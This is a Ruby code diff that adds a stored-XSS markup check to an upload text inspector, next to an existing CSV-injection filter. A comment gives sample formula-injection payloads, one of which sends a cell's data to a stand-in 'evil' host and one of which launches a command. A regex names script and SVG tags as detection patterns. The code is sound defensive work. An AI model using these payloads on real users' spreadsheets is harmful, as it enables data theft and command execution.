@@ -9,6 +9,8 @@ module UploadInspector
   # - CSV/TSV only, unless allow_csv_formulas: no cell that a spreadsheet would run as a
   #   formula calling a function or another program (CSV injection), e.g.
   #   =HYPERLINK("http://evil/?"&A1), +cmd|' /C calc'!A0, @SUM(1)
+  # - unless allow_text_markup: no HTML, SVG or server-side script tags. A browser or proxy
+  #   that sniffs content (missing nosniff, old IE) renders such a .txt as a page (stored XSS).
   class TextInspector
     include Rejectable
 
@@ -26,6 +28,8 @@ module UploadInspector
     # (program|topic!item); arithmetic, negative numbers, phone numbers like +1 (555) 010 and
     # @handles stay accepted.
     FORMULA_ACTION = /\p{L}[\p{L}\d_.]*\(|\|/
+    # Opening tags only ("<script>", "<svg/onload=..."), so data like "a<b" or "x < html" passes.
+    MARKUP = %r{<(?:script|html|head|body|iframe|frame|svg|object|embed|meta|base|link|style|img)[\s/>]|<\?php|<%|<!doctype\s+html}i
 
     def initialize(policy)
       @policy = policy
@@ -39,6 +43,7 @@ module UploadInspector
       text = text.delete_prefix(UTF8_BOM).force_encoding(Encoding::UTF_8)
       reject!(:text_unsupported_encoding, 'not valid UTF-8') unless text.valid_encoding?
       reject!(:text_binary_content, 'control characters') if text.match?(CONTROL)
+      reject!(:text_markup, text[MARKUP]) if !@policy.allow_text_markup && text.match?(MARKUP)
       check_formulas!(text) if SPREADSHEET_TYPES.include?(type) && !@policy.allow_csv_formulas
     end
 
